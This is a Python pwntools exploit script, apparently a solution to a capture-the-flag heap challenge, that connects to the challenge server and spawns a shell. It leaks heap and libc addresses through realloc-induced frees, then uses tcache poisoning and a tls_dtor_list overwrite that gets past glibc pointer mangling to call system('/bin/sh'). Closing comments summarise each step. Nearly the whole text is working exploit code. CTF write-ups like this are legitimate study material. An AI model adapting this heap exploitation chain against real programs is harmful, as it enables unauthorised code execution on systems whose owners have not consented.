#!/usr/bin/env python3

from pwn import *

l = ELF('./libc.so.6')
r = remote('re.chal.ctf.acsc.asia', 9999)
#gdb.attach(r)

def edit(idx, size, data):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', str(idx).encode('ascii'))
    r.sendlineafter(b': ', str(size).encode('ascii'))
    if size > 1:
        r.sendafter(b': ', data)

def show():
    r.sendlineafter(b'> ', b'2')

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

# Leak heap base
edit(0, 0x68, b'aaaa')
edit(0, 0x0, b'')
edit(1, 0x68, b'bbbb')
edit(0, 0x0, b'')
show()
r.recvn(4)
heap = u64(r.recvn(5) + b'\x00\x00\x00') << 12
log.info('heap = 0x%x', heap)

# 
edit(1, 0x68, b'\x00' * 16)
edit(0, 0x0, b'')
edit(1, 0x68, p64((heap + 0x10) ^ (heap >> 12)))

edit(8, 0x18, b'cccc')
edit(8, 0x0, b'')
edit(9, 0x18, b'dddd')
edit(8, 0x0, b'')
edit(9, 0x18, b'\x00' * 16)
edit(8, 0x0, b'')
edit(9, 0x18, p64((heap + 0x10) ^ (heap >> 12)))

edit(2, 0x68, b'\n')
edit(3, 0x68, b'\x07\x00' * 0x28)
edit(4, 0x18, b'\n')
edit(5, 0x18, b'\n')
edit(5, 0x0, b'')

show()
r.recvline()
r.recvline()
r.recvn(4)
l.address = u64(r.recvn(6) + b'\x00\x00') - 0x219ce0
log.info('libc = 0x%x', l.address)

edit(0, 0x78, b'\x01\x00' * 0x3b)
pl = p64(l.address - 0x2920) + p64(l.address - 0x2890) + p64(rol(l.symbols['system'], 0x11, 64)) + p64(l.address + 0x1d8698) + p64(0) * 2
edit(1, 0x78, pl)

edit(6, 0x18, p64(0) + p64(heap + 0xa0))
edit(7, 0x28, p64(0))

r.sendlineafter(b'> ', b'0')
r.interactive()

# nyancat
# Rough explaination:

# + `realloc(ptr, 0)` will free ptr
# + Abuse this to free chunk that other idx point to -> Leak tcache key (also heap base)
# + Use tcache poisoning to double free and alloc new chunk at `tcache_perthread_struct`
# + Point another idx to this chunk, also set tcache count of size `0x290` to 7
# + Free `tcache_perthread_struct` -> Chunk will be put in unsorted bin -> Can leak libc address
# + Control `tcache_perthread_struct` to point `entry` of some sizes to `tls_dtor_list` and TEB block to bypass `PTR_DEMANGLE`
# + Point `tls_dtor_list` to controlled data on the heap to call `system('/bin/sh')`


